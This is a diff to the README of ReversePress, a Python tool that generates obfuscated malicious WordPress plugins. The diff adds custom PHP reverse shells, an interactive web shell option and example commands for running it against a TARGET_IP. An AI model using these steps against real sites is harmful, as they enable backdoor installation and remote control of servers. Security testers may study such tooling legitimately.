@@ -4,9 +4,11 @@ ReversePress is a Python-based tool designed for generating malicious WordPress 
 
 ## Features
 -   Embeds a PHP reverse shell into a custom WordPress plugin
+-   Supports of custom PHP reverse shells
 -   Obfuscates the plugin code to avoid detection
 -   Compresses the plugin into a zip archive ready for deployment
 -   Provides the ability to listen for incoming connections after the plugin has been deployed
+-   Provides the ability to start an interactive web shell session on the target
 
 ## Usage
     usage: reversePress.py [-h] [-i INPUT] [-l] [-o OUTPUT] [-p PORT] host
@@ -20,6 +22,9 @@ ReversePress is a Python-based tool designed for generating malicious WordPress 
       -l, --listener                start a netcat listener after generating the plugin
       -o OUTPUT, --output OUTPUT    name of the file to be generated
       -p PORT, --port PORT          port to listen on
+      -w, --webshell                use a PHP web shell
+      -x TARGET, --xinteractive TARGET
+                                    start a interactive web shell on the target
 
 ## Getting Started
 1.  Clone the repository: `git clone https://github.com/MachadoOtto/reversePress.git`
@@ -39,6 +44,10 @@ ReversePress is a Python-based tool designed for generating malicious WordPress 
 3.  Custom port and start a Netcat listener:
 
         python reversePress.py HOST_IP -p 1234 -l
+
+4.  Use a PHP web shell and start the Interactive Web Shell session on the target:
+        
+        python reversePress.py HOST_IP -w -x http://TARGET_IP
 
 ## License
 
